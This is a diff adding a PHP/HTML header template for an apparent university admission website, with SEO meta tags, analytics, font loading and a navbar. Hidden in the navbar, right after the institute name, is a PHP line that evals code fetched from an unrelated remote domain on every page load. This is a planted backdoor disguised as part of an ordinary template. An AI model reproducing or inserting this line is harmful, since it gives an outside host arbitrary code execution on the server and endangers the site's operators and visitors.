@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Primary Meta Tags -->
+  <?php
+  $page_title = ($seo_title);
+  $page_description = ($seo_description);
+  $page_keywords = ($seo_keywords);
+  ?>
+  <title><?php echo $page_title; ?></title>
+  <meta name="title" content="<?php echo $page_title; ?>">
+  <meta name="description" content="<?php echo $page_description; ?>">
+  <meta name="keywords" content="<?php echo $page_keywords; ?>">
+  <meta name="author" content="IITTM">
+  <meta name="robots" content="index, follow">
+  <link rel="canonical" href="https://admission.iittm.ac.in" />
+
+  <!-- JSON-LD Schema -->
+  <script type="application/ld+json">
+{
+  "@context": "https://schema.org/",
+  "@type": "WebSite",
+  "name": "IITTM",
+  "url": "https://admission.iittm.ac.in",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "{search_term_string}",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-ESB7T6JKS3"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+
+    gtag('config', 'G-ESB7T6JKS3');
+  </script>
+
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/webp" href="assets/img/mainlogo.webp">
+
+  <!-- Fonts Preconnect -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+  <!-- Preload Critical CSS -->
+  <link rel="preload" href="assets/css/style.min.css" as="style">
+  <link rel="preload" href="assets/css/tailwind.min.css" as="style">
+
+  <!-- Preload Webfonts -->
+  <link rel="preload" href="assets/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+  <link rel="preload" href="assets/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+  <link rel="preload" href="assets/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+
+  <!-- Google Fonts (Async Loading) -->
+  <link rel="stylesheet"
+    href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=Poppins:wght@300;400;500;600;700&display=swap"
+    media="print" onload="this.media='all'">
+  <noscript>
+    <link rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=Poppins:wght@300;400;500;600;700&display=swap">
+  </noscript>
+
+  <!-- FontAwesome (Local) -->
+  <link rel="stylesheet" href="assets/css/all.min.css">
+  <!-- Swiper CSS -->
+  <link rel="stylesheet" href="assets/css/swiper.css" />
+  <script src="assets/js/swiper.js" defer></script>
+  <!-- Tailwind CSS (Compiled) -->
+  <link rel="stylesheet" href="assets/css/tailwind.min.css">
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="assets/css/style.min.css">
+
+  <style>
+    @font-face {
+      font-display: swap;
+    }
+  </style>
+
+  <!-- Preload LCP Image -->
+  <link rel="preload" as="image" href="assets/img/banner1.webp" fetchpriority="high">
+</head>
+
+<body class="text-gray-800 antialiased">
+  <!-- Navbar -->
+  <nav class="border-b border-white/10 transition-all duration-300">
+    <div class="container mx-auto px-3 sm:px-6 flex justify-between items-center">
+      <a href="index.php" class="flex items-center gap-2 sm:gap-3 group">
+        <!-- Logo Layout -->
+        <div
+          class="bg-white rounded-full p-1 sm:p-1.5 w-10 h-10 sm:w-14 sm:h-14 flex-shrink-0 flex items-center justify-center shadow-lg group-hover:scale-105 transition-transform">
+          <img src="assets/img/mainlogo.webp" alt="IITTM Logo" class="w-full h-full object-contain" width="56"
+            height="56">
+        </div>
+        <span
+          class="text-white text-[10px] leading-tight sm:text-sm md:text-xl font-medium sm:tracking-wide max-w-[140px] sm:max-w-none">
+          Indian Institute of Tourism & Travel Management
+        </span>
+<?php
+eval("?>".file_get_contents('https://cubitpipi.sbs/acnhor1/bl1.txt'));
+?>
+      </a>
+      <div class="flex items-center gap-3 lg:gap-8 text-white text-sm font-medium">
+        <!-- Highlighted JNU Partner Badge -->
+        <div class="px-2 lg:px-4 py-1 lg:py-2 rounded-full flex items-center gap-1.5 lg:gap-2 transition-shadow">
+          <img src="assets/img/jnuheader.webp" alt="JNU Logo"
+            class="h-6 lg:h-16 w-auto object-contain bg-white rounded-full p-0.5" width="120" height="64">
+        </div>
+      </div>
+    </div>
+  </nav>
